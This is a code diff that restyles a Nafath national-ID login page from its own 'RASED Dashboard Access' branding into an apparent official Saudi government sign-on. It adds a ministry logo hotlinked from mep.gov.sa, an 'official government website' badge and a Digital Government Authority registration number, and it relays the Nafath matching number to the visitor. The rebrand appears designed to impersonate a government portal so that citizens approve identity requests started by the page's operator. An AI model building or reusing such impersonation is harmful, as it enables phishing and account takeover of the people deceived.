@@ -109,181 +109,537 @@ function getActiveSession(transactionId) {
 
 function renderCitizenEntryPage() {
   return `<!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>RASED Access</title>
+  <title>تسجيل الدخول الموحد</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
   <style>
     :root {
-      --bg: #f4efe4;
-      --panel: #fffaf0;
-      --ink: #1f2a1f;
-      --muted: #55614d;
-      --accent: #1f6b52;
-      --accent-2: #d6a74f;
-      --danger: #9e2a2b;
-      --border: rgba(31, 42, 31, 0.12);
-      --shadow: 0 24px 60px rgba(54, 58, 43, 0.16);
+      --primary-green: #1B8354;
+      --dark-green: #067647;
+      --bg-light: #F3F4F6;
+      --bg-page: #f8f9fa;
+      --text-dark: #161616;
+      --text-gray: #384250;
+      --white: #ffffff;
+      --border-color: #e5e7eb;
+      --nafath-green: #2d7a4c;
     }
 
-    * { box-sizing: border-box; }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    
     body {
-      margin: 0;
+      font-family: 'Tajawal', 'Segoe UI', Tahoma, sans-serif;
+      background: var(--bg-page);
       min-height: 100vh;
-      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
-      background:
-        radial-gradient(circle at top left, rgba(214, 167, 79, 0.24), transparent 28%),
-        linear-gradient(135deg, #ebe2cf 0%, var(--bg) 42%, #dbe7de 100%);
-      color: var(--ink);
-      display: grid;
-      place-items: center;
-      padding: 24px;
+      display: flex;
+      flex-direction: column;
+      color: var(--text-dark);
     }
 
-    .shell {
-      width: min(720px, 100%);
-      background: rgba(255, 250, 240, 0.94);
-      backdrop-filter: blur(10px);
-      border: 1px solid var(--border);
-      border-radius: 24px;
-      box-shadow: var(--shadow);
+    /* Header with Logo */
+    .header {
+      padding: 16px 32px;
+      background: var(--white);
+      border-bottom: 1px solid var(--border-color);
+      display: flex;
+      justify-content: flex-end;
+      align-items: center;
+    }
+
+    html[dir="ltr"] .header {
+      justify-content: flex-start;
+    }
+
+    .logo-container {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .logo-container img {
+      height: 50px;
+      width: auto;
+    }
+
+    .lang-toggle {
+      position: absolute;
+      left: 32px;
+      background: transparent;
+      border: 1px solid var(--border-color);
+      border-radius: 8px;
+      padding: 8px 16px;
+      cursor: pointer;
+      font-family: inherit;
+      font-size: 14px;
+      color: var(--text-dark);
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    html[dir="ltr"] .lang-toggle {
+      left: auto;
+      right: 32px;
+    }
+
+    .lang-toggle:hover {
+      background: var(--bg-light);
+    }
+
+    /* Main Content */
+    .main-content {
+      flex: 1;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 40px 24px;
+    }
+
+    .login-card {
+      width: 100%;
+      max-width: 480px;
+      background: var(--white);
+      border-radius: 16px;
+      box-shadow: 0 4px 24px rgba(0, 0, 0, 0.08);
       overflow: hidden;
     }
 
-    .hero {
-      padding: 32px 32px 20px;
-      background: linear-gradient(145deg, rgba(31, 107, 82, 0.92), rgba(37, 73, 56, 0.92));
-      color: #f7f3eb;
+    .card-header {
+      padding: 32px 32px 24px;
+      text-align: center;
+      border-bottom: 1px solid var(--border-color);
     }
 
-    .hero h1 {
-      margin: 0 0 12px;
-      font-size: clamp(2rem, 4vw, 3rem);
-      letter-spacing: 0.02em;
-    }
-
-    .hero p {
-      margin: 0;
-      max-width: 54ch;
-      color: rgba(247, 243, 235, 0.86);
-      line-height: 1.6;
-    }
-
-    .body {
-      padding: 28px 32px 32px;
-    }
-
-    form {
-      display: grid;
-      gap: 16px;
-    }
-
-    label {
-      font-size: 0.95rem;
-      color: var(--muted);
-    }
-
-    input {
-      width: 100%;
-      padding: 16px 18px;
-      border-radius: 14px;
-      border: 1px solid rgba(31, 42, 31, 0.18);
-      font-size: 1.1rem;
-      background: rgba(255, 255, 255, 0.8);
-    }
-
-    button {
-      appearance: none;
-      border: 0;
-      border-radius: 14px;
-      padding: 16px 18px;
-      background: linear-gradient(135deg, var(--accent), #255d48);
-      color: white;
-      font-size: 1rem;
+    .card-header h1 {
+      font-size: 1.75rem;
       font-weight: 700;
-      cursor: pointer;
+      margin-bottom: 8px;
+      color: var(--text-dark);
     }
 
-    button[disabled] {
+    .card-header p {
+      color: var(--text-gray);
+      font-size: 0.95rem;
+    }
+
+    .card-body {
+      padding: 32px;
+    }
+
+    /* Nafath Section */
+    .nafath-section {
+      text-align: center;
+    }
+
+    .nafath-icon {
+      width: 80px;
+      height: 80px;
+      margin: 0 auto 24px;
+      background: linear-gradient(135deg, #e8f5e9, #c8e6c9);
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .nafath-icon svg {
+      width: 40px;
+      height: 40px;
+      fill: var(--primary-green);
+    }
+
+    .nafath-description {
+      color: var(--text-gray);
+      font-size: 0.95rem;
+      line-height: 1.7;
+      margin-bottom: 24px;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+      text-align: right;
+    }
+
+    html[dir="ltr"] .form-group {
+      text-align: left;
+    }
+
+    .form-group label {
+      display: block;
+      margin-bottom: 8px;
+      font-size: 0.95rem;
+      font-weight: 500;
+      color: var(--text-dark);
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 14px 16px;
+      border: 1px solid var(--border-color);
+      border-radius: 10px;
+      font-size: 1rem;
+      font-family: inherit;
+      transition: border-color 0.2s, box-shadow 0.2s;
+      text-align: right;
+      direction: ltr;
+    }
+
+    html[dir="ltr"] .form-group input {
+      text-align: left;
+    }
+
+    .form-group input:focus {
+      outline: none;
+      border-color: var(--primary-green);
+      box-shadow: 0 0 0 3px rgba(27, 131, 84, 0.1);
+    }
+
+    .nafath-btn {
+      width: 100%;
+      padding: 16px 24px;
+      background: var(--nafath-green);
+      color: var(--white);
+      border: none;
+      border-radius: 10px;
+      font-size: 1rem;
+      font-weight: 600;
+      font-family: inherit;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      transition: background 0.2s;
+    }
+
+    .nafath-btn:hover {
+      background: var(--dark-green);
+    }
+
+    .nafath-btn:disabled {
       opacity: 0.6;
       cursor: wait;
     }
 
-    .status {
-      margin-top: 20px;
-      padding: 18px;
-      border-radius: 16px;
-      border: 1px solid var(--border);
-      background: rgba(255, 255, 255, 0.66);
-      display: none;
+    .nafath-btn svg {
+      width: 24px;
+      height: 24px;
+      fill: currentColor;
     }
 
-    .status.visible {
+    /* Status Card */
+    .status-card {
+      margin-top: 24px;
+      padding: 20px;
+      border-radius: 12px;
+      border: 1px solid var(--border-color);
+      background: var(--bg-light);
+      display: none;
+      text-align: center;
+    }
+
+    .status-card.visible {
       display: block;
-      animation: fadeIn 220ms ease;
+      animation: fadeIn 0.3s ease;
+    }
+
+    .status-message {
+      color: var(--text-dark);
+      font-weight: 500;
+      margin-bottom: 8px;
+    }
+
+    .status-detail {
+      color: var(--text-gray);
+      font-size: 0.9rem;
     }
 
     .random-box {
-      display: inline-grid;
-      place-items: center;
-      min-width: 110px;
-      margin: 12px 0;
-      padding: 16px 20px;
-      border-radius: 18px;
-      background: linear-gradient(135deg, rgba(214, 167, 79, 0.2), rgba(31, 107, 82, 0.12));
-      color: var(--accent);
-      font-size: 2.1rem;
-      font-weight: 800;
-      letter-spacing: 0.08em;
-    }
-
-    .hint {
-      margin: 0;
-      color: var(--muted);
-      line-height: 1.6;
-    }
-
-    .error {
-      color: var(--danger);
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      min-width: 100px;
+      margin: 16px 0;
+      padding: 16px 24px;
+      border-radius: 12px;
+      background: linear-gradient(135deg, var(--primary-green), var(--dark-green));
+      color: var(--white);
+      font-size: 2rem;
       font-weight: 700;
+      letter-spacing: 0.1em;
     }
 
-    .success {
-      color: var(--accent);
+    .status-error .status-message {
+      color: #d32f2f;
+    }
+
+    .status-success .status-message {
+      color: var(--primary-green);
+    }
+
+    /* Footer */
+    .footer {
+      background: var(--bg-light);
+      border-top: 1px solid var(--border-color);
+      padding: 20px 32px;
+    }
+
+    .footer-content {
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+
+    .footer-row {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 16px;
+    }
+
+    .gov-badge {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    .gov-badge svg {
+      width: 24px;
+      height: 24px;
+      fill: var(--primary-green);
+    }
+
+    .gov-badge span {
+      font-size: 0.9rem;
+      color: var(--text-dark);
+    }
+
+    .verify-link {
+      color: var(--primary-green);
+      font-size: 0.9rem;
+      text-decoration: none;
+      cursor: pointer;
+    }
+
+    .verify-link:hover {
+      text-decoration: underline;
+    }
+
+    .dga-registration {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      padding: 12px 20px;
+      background: var(--white);
+      border-radius: 8px;
+    }
+
+    .dga-registration svg {
+      width: 32px;
+      height: 32px;
+    }
+
+    .dga-registration .dga-text {
+      font-size: 0.85rem;
+      color: var(--text-gray);
+    }
+
+    .dga-registration .dga-number {
       font-weight: 700;
+      color: var(--primary-green);
+      font-size: 0.95rem;
     }
 
     @keyframes fadeIn {
       from { opacity: 0; transform: translateY(4px); }
       to { opacity: 1; transform: translateY(0); }
     }
+
+    @media (max-width: 600px) {
+      .header {
+        padding: 12px 16px;
+      }
+      .lang-toggle {
+        position: static;
+        margin-left: auto;
+      }
+      html[dir="ltr"] .lang-toggle {
+        margin-left: 0;
+        margin-right: auto;
+      }
+      .main-content {
+        padding: 24px 16px;
+      }
+      .card-header, .card-body {
+        padding: 24px 20px;
+      }
+      .footer {
+        padding: 16px;
+      }
+      .footer-row {
+        flex-direction: column;
+        align-items: flex-start;
+      }
+    }
   </style>
 </head>
 <body>
-  <main class="shell">
-    <section class="hero">
-      <h1>RASED Dashboard Access</h1>
-      <p>Enter the citizen national ID, approve the matching number in Nafath on the mobile device, and you will be redirected automatically when verification is completed.</p>
-    </section>
-    <section class="body">
-      <form id="loginForm">
-        <div>
-          <label for="nationalId">National ID</label>
-          <input id="nationalId" name="nationalId" inputmode="numeric" autocomplete="off" maxlength="10" placeholder="Enter national ID" required>
-        </div>
-        <button id="submitBtn" type="submit">Start Nafath Verification</button>
-      </form>
+  <!-- Header with MEP Logo -->
+  <header class="header">
+    <div class="logo-container">
+      <img src="https://www.mep.gov.sa/themes/mep/assets/img/logo-mep.svg" alt="Ministry of Economy and Planning Logo">
+    </div>
+    <button class="lang-toggle" onclick="toggleLanguage()">
+      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+        <circle cx="12" cy="12" r="10"></circle>
+        <line x1="2" y1="12" x2="22" y2="12"></line>
+        <path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"></path>
+      </svg>
+      <span id="langText">English</span>
+    </button>
+  </header>
 
-      <section id="statusCard" class="status" aria-live="polite">
-        <p id="message" class="hint"></p>
-        <div id="randomBox" class="random-box" hidden>--</div>
-        <p id="subMessage" class="hint"></p>
-      </section>
-    </section>
+  <!-- Main Content -->
+  <main class="main-content">
+    <div class="login-card">
+      <div class="card-header">
+        <h1 id="titleText">تسجيل الدخول</h1>
+        <p id="subtitleText">الدخول عبر النفاذ الوطني الموحد</p>
+      </div>
+      <div class="card-body">
+        <div class="nafath-section">
+          <div class="nafath-icon">
+            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+            </svg>
+          </div>
+          <p class="nafath-description" id="descriptionText">
+            سيتم توجيهك إلى تطبيق نفاذ الوطني للتحقق من الهوية بشكل آمن وسريع عبر الهوية الوطنية أو الإقامة.
+          </p>
+          <form id="loginForm">
+            <div class="form-group">
+              <label for="nationalId" id="labelText">رقم الهوية الوطنية / الإقامة</label>
+              <input id="nationalId" name="nationalId" inputmode="numeric" autocomplete="off" maxlength="10" placeholder="" required>
+            </div>
+            <button id="submitBtn" type="submit" class="nafath-btn">
+              <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+              </svg>
+              <span id="btnText">الدخول عبر نفاذ</span>
+            </button>
+          </form>
+
+          <section id="statusCard" class="status-card" aria-live="polite">
+            <p id="message" class="status-message"></p>
+            <div id="randomBox" class="random-box" hidden>--</div>
+            <p id="subMessage" class="status-detail"></p>
+          </section>
+        </div>
+      </div>
+    </div>
   </main>
 
+  <!-- Footer with DGA Registration -->
+  <footer class="footer">
+    <div class="footer-content">
+      <div class="footer-row">
+        <div class="gov-badge">
+          <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/>
+          </svg>
+          <span id="govText">موقع حكومي رسمي تابع لحكومة المملكة العربية السعودية</span>
+        </div>
+        <div class="dga-registration">
+          <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+            <rect x="4" y="4" width="40" height="40" rx="4" fill="#067647"/>
+            <path d="M24 12v24M12 24h24" stroke="white" stroke-width="3" stroke-linecap="round"/>
+          </svg>
+          <div>
+            <div class="dga-text" id="dgaText">Registered with the Digital Government Authority under number :</div>
+            <div class="dga-number">20260506590</div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </footer>
+
   <script>
+    let isArabic = true;
+
+    const translations = {
+      ar: {
+        lang: "English",
+        title: "تسجيل الدخول",
+        subtitle: "الدخول عبر النفاذ الوطني الموحد",
+        description: "سيتم توجيهك إلى تطبيق نفاذ الوطني للتحقق من الهوية بشكل آمن وسريع عبر الهوية الوطنية أو الإقامة.",
+        label: "رقم الهوية الوطنية / الإقامة",
+        btn: "الدخول عبر نفاذ",
+        gov: "موقع حكومي رسمي تابع لحكومة المملكة العربية السعودية",
+        dga: "مسجل لدى هيئة الحكومة الرقمية برقم:",
+        sending: "جاري إرسال الطلب إلى نفاذ...",
+        wait: "يرجى الانتظار...",
+        openNafath: "افتح تطبيق نفاذ على جهازك.",
+        selectOtp: "اختر الرقم المطابق للرقم المعروض أدناه.",
+        waiting: "في انتظار الموافقة من نفاذ...",
+        waitingDetail: "اختر الرقم المطابق في تطبيق نفاذ للمتابعة.",
+        success: "تم التحقق بنجاح.",
+        redirecting: "جاري التوجيه إلى لوحة التحكم...",
+        rejected: "لم تتم الموافقة على الطلب.",
+        rejectedDetail: "تم رفض الطلب أو انتهت صلاحيته.",
+        error: "تعذر بدء التحقق من نفاذ.",
+        statusError: "تعذر التحقق من حالة الطلب."
+      },
+      en: {
+        lang: "العربية",
+        title: "Login",
+        subtitle: "Login via National Single Sign-On",
+        description: "You will be redirected to the Nafath app for secure and fast identity verification using your National ID or Iqama.",
+        label: "National ID / Iqama Number",
+        btn: "Login via Nafath",
+        gov: "Official government website of the Government of the Kingdom of Saudi Arabia",
+        dga: "Registered with the Digital Government Authority under number:",
+        sending: "Sending request to Nafath...",
+        wait: "Please wait...",
+        openNafath: "Open Nafath app on your device.",
+        selectOtp: "Select the OTP that matches the number shown below.",
+        waiting: "Waiting for Nafath approval...",
+        waitingDetail: "Choose the matching number in the Nafath app to continue.",
+        success: "Verification completed.",
+        redirecting: "Redirecting to your dashboard...",
+        rejected: "Verification was not approved.",
+        rejectedDetail: "The request was rejected or expired.",
+        error: "Unable to start Nafath verification.",
+        statusError: "Unable to verify the Nafath request."
+      }
+    };
+
+    function toggleLanguage() {
+      isArabic = !isArabic;
+      const lang = isArabic ? 'ar' : 'en';
+      const t = translations[lang];
+      
+      document.documentElement.lang = lang;
+      document.documentElement.dir = isArabic ? 'rtl' : 'ltr';
+      
+      document.getElementById('langText').textContent = t.lang;
+      document.getElementById('titleText').textContent = t.title;
+      document.getElementById('subtitleText').textContent = t.subtitle;
+      document.getElementById('descriptionText').textContent = t.description;
+      document.getElementById('labelText').textContent = t.label;
+      document.getElementById('btnText').textContent = t.btn;
+      document.getElementById('govText').textContent = t.gov;
+      document.getElementById('dgaText').textContent = t.dga;
+    }
+
+    function getTranslation(key) {
+      const lang = isArabic ? 'ar' : 'en';
+      return translations[lang][key] || key;
+    }
     const form = document.getElementById("loginForm");
     const submitBtn = document.getElementById("submitBtn");
     const statusCard = document.getElementById("statusCard");
@@ -294,8 +650,9 @@ function renderCitizenEntryPage() {
 
     function showStatus(text, detail, variant, randomValue) {
       statusCard.classList.add("visible");
+      statusCard.className = "status-card visible" + (variant === "error" ? " status-error" : variant === "success" ? " status-success" : "");
       message.textContent = text;
-      message.className = variant ? variant : "hint";
+      message.className = "status-message";
       subMessage.textContent = detail || "";
 
       if (randomValue) {
@@ -327,19 +684,19 @@ function renderCitizenEntryPage() {
 
       if (data.state === "approved" && data.redirectUrl) {
         stopPolling();
-        showStatus("Verification completed.", "Redirecting to your assigned dashboard.", "success", data.random);
+        showStatus(getTranslation('success'), getTranslation('redirecting'), "success", data.random);
         window.location.assign(data.redirectUrl);
         return;
       }
 
       if (data.state === "rejected") {
         stopPolling();
-        showStatus("Verification was not approved.", data.message || "The request was rejected or expired.", "error", data.random);
+        showStatus(getTranslation('rejected'), data.message || getTranslation('rejectedDetail'), "error", data.random);
         submitBtn.disabled = false;
         return;
       }
 
-      showStatus("Waiting for Nafath approval.", data.message || "Choose the matching number in the Nafath app to continue.", "hint", data.random);
+      showStatus(getTranslation('waiting'), data.message || getTranslation('waitingDetail'), "", data.random);
     }
 
     form.addEventListener("submit", async (event) => {
@@ -348,7 +705,7 @@ function renderCitizenEntryPage() {
 
       const nationalId = document.getElementById("nationalId").value.trim();
       submitBtn.disabled = true;
-      showStatus("Sending request to Nafath.", "Please wait...", "hint");
+      showStatus(getTranslation('sending'), getTranslation('wait'), "");
 
       try {
         const response = await fetch("/nafath/start", {
@@ -363,9 +720,9 @@ function renderCitizenEntryPage() {
         }
 
         showStatus(
-          "Open Nafath on your mobile device.",
-          "Select the OTP that matches the random number shown below.",
-          "hint",
+          getTranslation('openNafath'),
+          getTranslation('selectOtp'),
+          "",
           data.random
         );
 
@@ -373,18 +730,18 @@ function renderCitizenEntryPage() {
           checkStatus(data.transactionId).catch((error) => {
             stopPolling();
             submitBtn.disabled = false;
-            showStatus("Unable to verify the Nafath request.", error.message, "error", data.random);
+            showStatus(getTranslation('statusError'), error.message, "error", data.random);
           });
         }, 3000);
 
         checkStatus(data.transactionId).catch((error) => {
           stopPolling();
           submitBtn.disabled = false;
-          showStatus("Unable to verify the Nafath request.", error.message, "error", data.random);
+          showStatus(getTranslation('statusError'), error.message, "error", data.random);
         });
       } catch (error) {
         submitBtn.disabled = false;
-        showStatus("Unable to start Nafath verification.", error.message, "error");
+        showStatus(getTranslation('error'), error.message, "error");
       }
     });
   </script>
